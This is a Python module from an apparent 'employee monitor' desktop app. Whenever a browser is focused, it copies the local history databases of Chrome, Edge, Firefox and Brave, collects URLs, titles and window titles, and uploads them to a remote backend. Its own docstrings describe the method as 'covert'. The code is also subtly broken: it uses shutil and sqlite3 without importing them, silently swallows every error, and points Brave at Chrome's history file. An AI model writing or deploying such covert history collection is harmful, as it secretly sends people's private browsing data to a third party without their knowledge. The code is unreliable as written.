import hashlib
import json
import os
import threading
import time
import urllib.error
import urllib.request
from pathlib import Path
from datetime import datetime

# Low-level Windows hooks for process tracking
import win32gui
import win32process
import psutil

# Pull the path framework matching the rest of your app
from app.auth import load_auth_session
from app.env import writable_runtime_path
from app.monitor_settings import get_monitor_feature_flags

# Separate path targets exactly matching your project architecture
DATA_ROOT = writable_runtime_path(os.getenv("RIGWEDA_MONITOR_DATA_ROOT", r"%LOCALAPPDATA%\rigweda-monitor\data"), "data")
LOG_DIR = writable_runtime_path(os.getenv("RIGWEDA_MONITOR_LOG_ROOT", str(DATA_ROOT.parent / "logs")), "logs")
DEVICE_ID_FILE = DATA_ROOT / "device_id.txt"
DEFAULT_DESKTOP_BACKEND_URL = "https://rigweda-monitor-backend.vercel.app/api"

STATUS_LOG_FILE = Path(LOG_DIR) / "browser_monitor.log"  # Thread status logs here

# Global states to track changes dynamically
last_processed_time = {}  # Track last processed timestamp per browser
_STOP_EVENT = threading.Event()
_MONITOR_THREAD: threading.Thread | None = None


def get_active_window_info() -> tuple[str, str]:
    """Returns a tuple containing (executable_name, window_title)."""
    try:
        hwnd = win32gui.GetForegroundWindow()
        if hwnd:
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = psutil.Process(pid)
            return process.name().lower(), win32gui.GetWindowText(hwnd)
    except Exception:
        pass
    return "unknown_app.exe", "Unknown Application Window"


def get_device_id() -> str:
    DATA_ROOT.mkdir(parents=True, exist_ok=True)
    try:
        value = DEVICE_ID_FILE.read_text(encoding="utf-8").strip()
    except FileNotFoundError:
        value = ""
    if not value:
        import uuid

        value = f"dev_{uuid.uuid4().hex}"
        DEVICE_ID_FILE.write_text(value, encoding="utf-8")
    return value


def _get_chrome_history() -> list[dict]:
    """Reads Chrome/Chromium browser history from the local database (covert method)."""
    history_entries = []
    try:
        username = os.getenv("USERNAME", "")
        chrome_paths = [
            Path(os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\History")),
            Path(os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome Beta\User Data\Default\History")),
            Path(os.path.expandvars(r"%LOCALAPPDATA%\Chromium\User Data\Default\History")),
        ]
        
        for db_path in chrome_paths:
            if not db_path.exists():
                continue
                
            # Create a temporary copy to avoid database locks
            temp_db = Path(os.path.expandvars(r"%TEMP%")) / f"chrome_history_temp_{int(time.time())}.db"
            try:
                shutil.copy2(db_path, temp_db)
                
                conn = sqlite3.connect(str(temp_db))
                cursor = conn.cursor()
                
                # Query the urls and visits tables
                cursor.execute("""
                    SELECT u.url, u.title, v.visit_time, v.visit_duration
                    FROM urls u
                    LEFT JOIN visits v ON u.id = v.url
                    WHERE v.visit_time > ?
                    ORDER BY v.visit_time DESC
                    LIMIT 100
                """, (int(time.time() * 1000000) - 3600 * 1000000,))  # Last hour
                
                for row in cursor.fetchall():
                    url, title, visit_time, duration = row
                    if url and visit_time:
                        # Convert Chrome timestamp to readable format
                        chrome_epoch = datetime(1601, 1, 1)
                        timestamp = chrome_epoch + __import__('datetime').timedelta(microseconds=visit_time)
                        history_entries.append({
                            "url": url,
                            "title": title or "",
                            "timestamp": timestamp.strftime("%Y-%m-%d %H:%M:%S"),
                            "duration": duration or 0,
                            "browser": "Chrome"
                        })
                
                conn.close()
            except Exception:
                pass
            finally:
                try:
                    if temp_db.exists():
                        temp_db.unlink()
                except Exception:
                    pass
    except Exception:
        pass
    
    return history_entries


def _get_firefox_history() -> list[dict]:
    """Reads Firefox browser history from the places.sqlite database (covert method)."""
    history_entries = []
    try:
        username = os.getenv("USERNAME", "")
        firefox_profile_path = Path(os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles"))
        
        if not firefox_profile_path.exists():
            return history_entries
        
        # Find the default profile
        for profile_dir in firefox_profile_path.iterdir():
            if profile_dir.is_dir():
                db_path = profile_dir / "places.sqlite"
                if not db_path.exists():
                    continue
                
                # Create a temporary copy to avoid database locks
                temp_db = Path(os.path.expandvars(r"%TEMP%")) / f"firefox_history_temp_{int(time.time())}.db"
                try:
                    shutil.copy2(db_path, temp_db)
                    
                    conn = sqlite3.connect(str(temp_db))
                    cursor = conn.cursor()
                    
                    # Query the history data
                    cursor.execute("""
                        SELECT p.url, p.title, v.visit_date
                        FROM moz_places p
                        LEFT JOIN moz_historyvisits v ON p.id = v.place_id
                        WHERE v.visit_date > ?
                        ORDER BY v.visit_date DESC
                        LIMIT 100
                    """, (int((time.time() - 3600) * 1000000),))  # Last hour
                    
                    for row in cursor.fetchall():
                        url, title, visit_date = row
                        if url and visit_date:
                            # Convert Firefox timestamp to readable format
                            timestamp = datetime.fromtimestamp(visit_date / 1000000)
                            history_entries.append({
                                "url": url,
                                "title": title or "",
                                "timestamp": timestamp.strftime("%Y-%m-%d %H:%M:%S"),
                                "browser": "Firefox"
                            })
                    
                    conn.close()
                except Exception:
                    pass
                finally:
                    try:
                        if temp_db.exists():
                            temp_db.unlink()
                    except Exception:
                        pass
    except Exception:
        pass
    
    return history_entries


def _get_edge_history() -> list[dict]:
    """Reads Microsoft Edge browser history from the local database (covert method)."""
    history_entries = []
    try:
        edge_path = Path(os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History"))
        
        if not edge_path.exists():
            return history_entries
        
        # Create a temporary copy to avoid database locks
        temp_db = Path(os.path.expandvars(r"%TEMP%")) / f"edge_history_temp_{int(time.time())}.db"
        try:
            shutil.copy2(edge_path, temp_db)
            
            conn = sqlite3.connect(str(temp_db))
            cursor = conn.cursor()
            
            # Query the urls and visits tables (same structure as Chrome)
            cursor.execute("""
                SELECT u.url, u.title, v.visit_time, v.visit_duration
                FROM urls u
                LEFT JOIN visits v ON u.id = v.url
                WHERE v.visit_time > ?
                ORDER BY v.visit_time DESC
                LIMIT 100
            """, (int(time.time() * 1000000) - 3600 * 1000000,))  # Last hour
            
            for row in cursor.fetchall():
                url, title, visit_time, duration = row
                if url and visit_time:
                    # Convert Chrome/Edge timestamp to readable format
                    chrome_epoch = datetime(1601, 1, 1)
                    timestamp = chrome_epoch + __import__('datetime').timedelta(microseconds=visit_time)
                    history_entries.append({
                        "url": url,
                        "title": title or "",
                        "timestamp": timestamp.strftime("%Y-%m-%d %H:%M:%S"),
                        "duration": duration or 0,
                        "browser": "Edge"
                    })
            
            conn.close()
        except Exception:
            pass
        finally:
            try:
                if temp_db.exists():
                    temp_db.unlink()
            except Exception:
                pass
    except Exception:
        pass
    
    return history_entries


def write_to_log_folder(text_to_log: str) -> None:
    """Saves thread activity metrics into the log folder."""
    try:
        STATUS_LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
        with STATUS_LOG_FILE.open("a", encoding="utf-8") as f:
            f.write(text_to_log)
    except Exception:
        pass


def _desktop_backend_url() -> str:
    return os.getenv("DESKTOP_BACKEND_URL", DEFAULT_DESKTOP_BACKEND_URL).rstrip("/")


def _browser_history_endpoint() -> str:
    return f"{_desktop_backend_url()}/browser-history/batch"


def _entry_timestamp_value(entry: dict) -> str:
    return str(entry.get("timestamp") or "").strip()


def _normalize_timestamp(timestamp: str) -> str:
    try:
        return datetime.strptime(timestamp, "%Y-%m-%d %H:%M:%S").isoformat()
    except ValueError:
        return timestamp


def _build_entry_id(*, device_id: str, entry: dict) -> str:
    digest = hashlib.sha256()
    digest.update(device_id.encode("utf-8"))
    digest.update(b"|")
    digest.update(str(entry.get("browser") or "").strip().lower().encode("utf-8"))
    digest.update(b"|")
    digest.update(_entry_timestamp_value(entry).encode("utf-8"))
    digest.update(b"|")
    digest.update(str(entry.get("url") or "").strip().encode("utf-8"))
    digest.update(b"|")
    digest.update(str(entry.get("title") or "").strip().encode("utf-8"))
    digest.update(b"|")
    digest.update(str(entry.get("activeWindow") or "").strip().encode("utf-8"))
    digest.update(b"|")
    digest.update(str(int(entry.get("duration") or 0)).encode("utf-8"))
    return digest.hexdigest()


def _prepare_history_payload(entries: list[dict]) -> tuple[dict[str, object] | None, str]:
    session = load_auth_session()
    token = str((session or {}).get("token") or "").strip()
    if not token:
        return None, "Browser history sync skipped: no saved token."

    device_id = get_device_id()
    payload_entries = []
    for entry in entries:
        payload_entries.append(
                {
                    "entryId": _build_entry_id(device_id=device_id, entry=entry),
                    "browser": str(entry.get("browser") or "").strip(),
                    "url": str(entry.get("url") or "").strip(),
                    "title": str(entry.get("title") or "").strip(),
                    "observedAt": _normalize_timestamp(str(entry.get("timestamp") or "").strip()),
                    "durationMs": int(entry.get("duration") or 0),
                    "activeWindowTitle": str(entry.get("activeWindow") or "").strip() or None,
                }
        )

    payload = {
        "deviceId": device_id,
        "entries": payload_entries,
        "token": token,
    }
    return payload, ""


def _sync_history_entries(entries: list[dict]) -> tuple[bool, str]:
    payload, message = _prepare_history_payload(entries)
    if not payload:
        return False, message

    token = str(payload.pop("token") or "").strip()
    request = urllib.request.Request(
        _browser_history_endpoint(),
        data=json.dumps(payload).encode("utf-8"),
        headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {token}",
        },
        method="POST",
    )

    try:
        with urllib.request.urlopen(request, timeout=30) as response:
            response_body = response.read().decode("utf-8", "replace")
            if response_body:
                try:
                    data = json.loads(response_body)
                    if isinstance(data, dict) and data.get("success") is False:
                        return False, str(data.get("message") or "Browser history sync failed.")
                except json.JSONDecodeError:
                    pass
        return True, "Browser history synced successfully."
    except urllib.error.HTTPError as error:
        response_body = ""
        try:
            response_body = error.read().decode("utf-8", "replace").strip()
        except Exception:
            response_body = ""
        detail = f"{error} {response_body}".strip()
        return False, detail or "Browser history sync failed."
    except (urllib.error.URLError, TimeoutError, OSError) as error:
        return False, str(error)


def check_browser_history():
    """Collects browser history from all installed browsers covertly via database access."""
    global last_processed_time
    
    try:
        current_app, current_title = get_active_window_info()
        target_browsers = ["chrome.exe", "msedge.exe", "firefox.exe", "brave.exe"]
        
        # Only actively log when a browser is in focus
        if current_app not in target_browsers:
            return
        
        # Map browser executable to history retrieval function
        browser_handlers = {
            "chrome.exe": _get_chrome_history,
            "msedge.exe": _get_edge_history,
            "firefox.exe": _get_firefox_history,
            "brave.exe": _get_chrome_history,  # Brave uses Chromium-based history
        }
        
        handler = browser_handlers.get(current_app)
        if not handler:
            return
        
        # Fetch history from the browser database (covert - no UI interaction)
        history_entries = handler()

        if not history_entries:
            return

        last_sent = str(last_processed_time.get(current_app, "") or "")
        pending_entries = []
        latest_timestamp = last_sent

        for entry in history_entries:
            timestamp = _entry_timestamp_value(entry)
            if not timestamp or timestamp <= last_sent:
                continue
            pending_entries.append(
                {
                    "browser": current_app,
                    "url": entry.get("url", ""),
                    "title": entry.get("title", ""),
                    "timestamp": timestamp,
                    "duration": entry.get("duration", 0),
                    "activeWindow": current_title,
                }
            )
            if timestamp > latest_timestamp:
                latest_timestamp = timestamp

        if not pending_entries:
            return

        success, message = _sync_history_entries(pending_entries)
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        if success:
            last_processed_time[current_app] = latest_timestamp
            write_to_log_folder(f"[{timestamp}] Browser history sync: {len(pending_entries)} entry(s) uploaded for {current_app}.\n")
        else:
            write_to_log_folder(f"[{timestamp}] Browser history sync failed for {current_app}: {message}\n")
    except Exception as e:
        error_msg = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Error collecting browser history: {str(e)}\n"
        write_to_log_folder(error_msg)


# --- EXPOSED HOOK FOR BACKGROUND DISPATCH ---

def start_browser_monitor() -> tuple[bool, str]:
    """Runs a background thread monitoring browser history via covert database access."""
    try:
        flags = get_monitor_feature_flags()
        if not flags.get("browserHistoryEnabled", False):
            return False, "Browser history monitor is disabled by Employee Monitor settings."

        global _MONITOR_THREAD
        if _MONITOR_THREAD is not None and _MONITOR_THREAD.is_alive():
            return True, "Browser monitor is already running."

        _STOP_EVENT.clear()
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        write_to_log_folder(f"\n[{timestamp}] --- Covert Browser History Monitor Thread Initialized ---\n")
        
        def monitor_loop():
            while not _STOP_EVENT.is_set():
                check_browser_history()
                _STOP_EVENT.wait(0.5)  # Check every 500ms for new history

        _MONITOR_THREAD = threading.Thread(target=monitor_loop, name="BrowserHistoryMonitor", daemon=True)
        _MONITOR_THREAD.start()
        return True, "Browser monitor started successfully."
    except Exception as e:
        return False, f"Failed to start browser monitor: {str(e)}"


def stop_browser_monitor() -> None:
    """Stops the background browser history monitoring thread."""
    global _MONITOR_THREAD

    _STOP_EVENT.set()
    thread = _MONITOR_THREAD
    if thread is not None and thread.is_alive():
        try:
            thread.join(timeout=2)
        except Exception:
            pass
    _MONITOR_THREAD = None

